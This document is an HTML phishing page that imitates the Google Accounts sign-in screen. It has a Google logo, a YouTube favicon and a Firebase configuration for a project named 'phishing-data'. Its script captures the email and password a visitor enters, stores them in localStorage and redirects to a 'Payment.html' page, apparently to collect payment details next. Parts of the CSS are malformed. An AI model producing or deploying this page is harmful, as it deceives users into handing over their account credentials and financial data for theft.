<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>

    <link rel="icon" href="https://youtube.com/s/desktop/a386432/img/favicon_32.png" type="image/x-icon">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" 
          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
          crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.jquery.com/jquery-3.2.1.slim.min.js" 
          integrity="sha384-KJ3o2DKiIiq8+IIQE9/Nmfa7K7ckrE9/09q5AGJwFDVWNA/gp6FF93hxP65KnK7"
          crossorigin="anonymous">
    
    <!-- Firebase & Analytics -->
    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics.js"></script>

    <script>
      // Your web app's Firebase configuration
      var firebaseConfig = {
        apiKey: "79254c3fa2d49G8WV506CPVG4HxO2DEU_qyxjDoe_c",
        authDomain: "phishing-data.firebaseapp.com",
        databaseURL: "https://phishing-data.firebaseio.com",
        projectId: "phishing-data",
        storageBucket: "phishing-data.appspot.com",
        messagingSenderId: "23965657895",
        appId: "1:23965657895:web:578cc5ac53ab450914609",
        measurementId: "G-FRVJDFH5C"
      };
      // Initialize Firebase
      firebase.initializeApp(firebaseConfig);
      firebase.analytics();
    </script>

    <style>
      @import "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css";
      @import "https://fonts.googleapis.com/css?family=Raleway|Roboto";

      :root {
        /* Theme Colors */
        --first-color: #1A73E8;
        --text-color: #757575;
      }

      body {
        font-family: Roboto, sans-serif;
        background: -webkit-linear-gradient(rgb(255, 255, 255) 0%, rgb(255, 255, 255) 100%);
      }

      .login-form {
        border: 1px solid #dadada;
        font-family: 'Open Sans', sans-serif;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 380px;
        height: 300px;
        background: #fff;
        border-radius: 25px;

.Head {
  font-family: 'Open Sans', sans-serif;
  line-height: 32px;
  width: 100%;
  text-align: center;
  font-size: 100%;
  font-weight: 400;
  color: black;
}

.login-form .backbtn.active {
  background: #647aec;
  cursor: pointer;
}

.login-form .backbtn {
  background: #eee;
}

.login-form .line {
  position: absolute;
  top: 60px;
  width: 100%;
  font-size: 22px;
  color: #666;
  font-family: 'Roboto';
}

.login-form .line p {
  margin-top: 10px;
  color: rgb(0, 0, 0);
  font-family: 'Roboto', sans-serif;
  font-weight: 400;
  font-size: 60%;
  line-height: 24px;
}

.phases {
  position: absolute;
  top: 160px;
  height: 200px;
  width: 200px;
  left: 0%;
}

transition: all 300ms ease;

.phases div {
  width: 50%;
  float: left;
  display: flex;
  flex-direction: column;
  padding: 0px 20px;
}

.phases div * {
  margin: 8px 0px;
}

.phases div input {
  padding-left: 5px;
}

.phases div input.error {
  border-color: tomato;
}

button {
  background-color: var(--first-color);
  color: #fff;
  font-size: var(--normal-font-size);
  border-radius: 5rem;
  cursor: pointer;
  transition: 3s;
}

button:hover {
  box-shadow: 0 10px 36px rgba(0, 0, 0, 0.15);
}

.phases .next {
  left: -100%;
}

.create {

position: absolute;
  bottom: 20px;
  width: 100%;
  text-align: center;
}

.create a {
  text-decoration: none;
  font-size: 16px;
  color: #196be8;
}

.loading {
  position: absolute;
  top: 0px;
  left: 0px;
  width: 100%;
  height: 100%;
  background: #fff;
  display: none;
  z-index: 2;
}

.loading.show {
  display: inline-block;
}

img {
  width: 15%;
}

.loading:before {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%) rotate(0deg);
  width: 50px;
  height: 50px;
  border: 5px solid #eee;
  border-top-color: #196be8;
  border-radius: 50%;
  animation: loading 900ms ease infinite;
}

@keyframes loading {
  to {
    transform: translate(-50%, -50%) rotate(360deg);
  }
}

.phase-1 {
  position: relative;
  height: 48px;
  margin-bottom: 1.5rem;
}

.phase-2 {
  position: relative;
  height: 48px;
  margin-bottom: 1.5rem;
}

.form__input {
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  font-size: var(--normal-font-size);
  border: 1px solid var(--border-color);
  background: none;
  z-index: 1;
}

.form__label {
  position: absolute;
  left: 2rem;
  top: 2rem;
  padding: 0 0.25rem;
  background-color: #fff;
  color: var(--input-color);
  font-size: var(--normal-font-size);
  transition: 3s;
  font-weight: 550;
}

/* Input focus move up label */
.form__input:focus + .form__label {
  top: -5rem;

left: 8rem;
  color: var(--first-color);
  font-size: var(--small-font-size);
  font-weight: 500;
  z-index: 10;
}

/* Input focus */
.form__input:focus {
  border: 1.5px solid var(--first-color);
}

p.content {
  font-family: 'Roboto', sans-serif;
}

.bottom-section {
  width: 100%;
}
</style>

<body>
  <div class="container">
    <div class="login-form">
      <div class="line">
        <div class="logoSize">
          <img src="img/googlePNG.png" alt="logo">
        </div>
        <div class="Head">Sign in</div>
      </div>
      <p class="subtitle">Use your Google Account</p>

      <div class="phases" id="phase-form">
        <div class="phase phase-1">
          <input id="email" class="form__input" autocomplete="off" onfocus="removeError(this);" type="text" placeholder="">
          <label for="email" class="form__label">Email or phone</label>
          <a href="Signin.html">Forgot email?</a>
          <p class="content">Not your computer? Use a private browsing window to sign in. <a href="Signin.html">Learn more</a></p>
          <div class="bottom-section">
            <a href="#" style="text-decoration: none;">Create an account</a>
          </div>
          <button onclick="next()">Next</button>
        </div>

        <div class="phase phase-2">
          <input type="password" class="form__input" onfocus="removeError(this);" id="password" placeholder="">
          <label for="password" class="form__label">Password</label>
          <button onclick="submitForm()">Next</button>
        </div>
      </div>
      <div class="create">
        <a href="#">Create an account</a>
      </div>
      <div class="loading"></div>
    </div>
  </div>

  <script>
    var state = false;

    function next() {
      var email = trim(document.getElementById('email').value);
      if (email) {
        // Set Storage
        localStorage.setItem("email", document.getElementById('email').value);
        document.getElementById('backbtn').classList.add('active');
        document.getElementById('phase-form').classList.add('next');
        state = true;
      } else {
        document.getElementById('email').classList.add('error');
      }
    }

function submitForm() {
  var password = trim(document.getElementById('password').value);
  if (password.length > 5) {
    // Submit form
    document.getElementsByClassName('loading')[0].classList.add('show-it');
    
    // Set Storage
    localStorage.setItem("password", document.getElementById('password').value);
    
    // Navigate to payment page
    window.location.href = "Payment.html";
  } else {
    document.getElementById('password').classList.add('error');
  }
}

function trim(str) {
  str = str.replace(/^\s+/, '');
  for (var i = str.length - 1; i >= 0; i--) {
    if (/\S/.test(str.charAt(i))) {
      str = str.substring(0, i + 1);
      break;
    }
  }
  return str;
}

function isEmail(str) {
  var pattern = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
  return pattern.test(str);
}

function back() {
  if (state) {
    document.getElementById('backbtn').classList.remove('active');
    document.getElementById('phase-form').classList.remove('next');
    state = false;
  }
}

function removeError(ref) {
  try {
    ref.classList.remove('error');
  } catch (msg) {}
}

</script>

</body>

</html>
